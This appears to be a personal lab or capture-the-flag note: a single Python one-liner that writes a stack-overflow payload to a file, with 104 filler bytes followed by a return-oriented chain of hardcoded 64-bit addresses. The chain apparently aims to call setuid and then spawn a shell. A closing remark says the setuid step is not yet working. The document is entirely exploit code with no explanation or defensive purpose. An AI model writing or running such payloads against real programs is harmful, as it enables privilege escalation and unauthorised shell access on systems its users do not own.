python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' +  '\x70\x99\xac\xf7\xff\x7f\x00\x00' + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x70\x99\xac\xf7\xff\x7f\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

setuid requires other field to work. not working at this time.

```
